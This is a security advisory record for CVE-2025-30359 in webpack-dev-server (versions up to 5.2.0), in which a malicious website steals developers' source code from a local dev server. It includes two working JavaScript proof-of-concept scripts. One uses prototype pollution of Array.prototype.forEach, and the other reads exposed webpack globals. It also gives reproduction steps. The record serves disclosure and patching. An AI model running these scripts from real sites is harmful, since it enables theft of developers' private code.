advisory_id: GHSA-4v9v-hfq4-rm2v
datasource_id: github_osv_importer_v2/GHSA-4v9v-hfq4-rm2v
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-4v9v-hfq4-rm2v/GHSA-4v9v-hfq4-rm2v.json
aliases:
  - CVE-2025-30359
summary: |
  webpack-dev-server users' source code may be stolen when they access a malicious web site
  ### Summary
  Source code may be stolen when you access a malicious web site.

  ### Details
  Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src="http://localhost:8080/main.js">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables.
  By using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.

  ### PoC
  1. Download [reproduction.zip](https://github.com/user-attachments/files/18426585/reproduction.zip) and extract it
  2. Run `npm i`
  3. Run `npx webpack-dev-server`
  4. Open `https://e29c9a88-a242-4fb4-9e64-b24c9d29b35b.pages.dev/`
  5. You can see the source code output in the document and the devtools console.

  ![image](https://github.com/user-attachments/assets/9d4dcdca-5d24-4c84-a7b4-feb1782bca09)

  The script in the POC site is:
  ```js
  let moduleList
  const onHandlerSet = (handler) => {
    console.log('h', handler)
    moduleList = handler.require.m
  }

  const originalArrayForEach = Array.prototype.forEach
  Array.prototype.forEach = function forEach(callback, thisArg) {
    callback((handler) => {
      onHandlerSet(handler)
    })
    originalArrayForEach.call(this, callback, thisArg)
    Array.prototype.forEach = originalArrayForEach
  }

  const script = document.createElement('script')
  script.src = 'http://localhost:8080/main.js'
  script.addEventListener('load', () => {
    console.log(moduleList)
    for (const key in moduleList) {
      const p = document.createElement('p')
      const title = document.createElement('strong')
      title.textContent = key
      const code = document.createElement('code')
      code.textContent = moduleList[key].toString()
      p.append(title, ':', document.createElement('br'), code)
      document.body.appendChild(p)
    }
  })
  document.head.appendChild(script)
  ```

  This script uses the function generated by [`renderRequire`](https://github.com/webpack/webpack/blob/3919c844eca394d73ca930e4fc5506fb86e2b094/lib/javascript/JavascriptModulesPlugin.js#L1383).
  ```js
      // The require function
      function __webpack_require__(moduleId) {
          // Check if module is in cache
          var cachedModule = __webpack_module_cache__[moduleId];
          if (cachedModule !== undefined) {
              return cachedModule.exports;
          }
          // Create a new module (and put it into the cache)
          var module = __webpack_module_cache__[moduleId] = {
              // no module.id needed
              // no module.loaded needed
              exports: {}
          };
          // Execute the module function
          var execOptions = {
              id: moduleId,
              module: module,
              factory: __webpack_modules__[moduleId],
              require: __webpack_require__
          };
          __webpack_require__.i.forEach(function(handler) {
              handler(execOptions);
          });
          module = execOptions.module;
          execOptions.factory.call(module.exports, module, module.exports, execOptions.require);
          // Return the exports of the module
          return module.exports;
      }
  ```
  Especially, it uses the fact that `Array::forEach` is called for `__webpack_require__.i` and `execOptions` contains `__webpack_require__`.
  It uses prototype pollution against `Array::forEach` to extract `__webpack_require__` reference.

  ### Impact
  This vulnerability can result in the source code to be stolen for users that uses a predictable port and output path for the entrypoint script.

  <details>
  <summary>Old content</summary>

  ### Summary
  Source code may be stolen when you use [`output.iife: false`](https://webpack.js.org/configuration/output/#outputiife) and access a malicious web site.

  ### Details
  When `output.iife: false` is set, some global variables for the webpack runtime are declared on the `window` object (e.g. `__webpack_modules__`).
  Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src="http://localhost:8080/main.js">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. By running that, the webpack runtime variables will be declared on the `window` object.
  By using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.

  I pointed out `output.iife: false`, but if there are other options that makes the webpack runtime variables to be declared on the `window` object, the same will apply for those cases.

  ### PoC
  1. Download [reproduction.zip](https://github.com/user-attachments/files/18409777/reproduction.zip) and extract it
  2. Run `npm i`
  3. Run `npx webpack-dev-server`
  4. Open `https://852aafa3-5f83-44da-9fc6-ea116d0e3035.pages.dev/`
  5. Open the devtools console.
  6. You can see the content of `src/index.js` and other scripts loaded.

  ![image](https://github.com/user-attachments/assets/87801607-57bb-4656-bc0d-2bfbe207f436)

  The script in the POC site is:
  ```js
  const script = document.createElement('script')
  script.src = 'http://localhost:8080/main.js'
  script.addEventListener('load', () => {
      for (const module in window.__webpack_modules__) {
          console.log(`${module}:`, window.__webpack_modules__[module].toString())
      }
  })
  document.head.appendChild(script)
  ```

  ### Impact
  This vulnerability can result in the source code to be stolen for users that has `output.iife: false` option set and uses a predictable port and output path for the entrypoint script.

  </details>
impacted_packages:
  - purl: pkg:npm/webpack-dev-server
    affected_versions: vers:npm/<=5.2.0
    fixed_versions: vers:npm/5.2.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '5.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-4v9v-hfq4-rm2v/GHSA-4v9v-hfq4-rm2v.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-749
references:
  - url: https://github.com/webpack/webpack-dev-server
    reference_type:
    reference_id:
  - url: https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e
    reference_type:
    reference_id:
  - url: https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239
    reference_type:
    reference_id:
  - url: https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-30359
    reference_type:
    reference_id: CVE-2025-30359
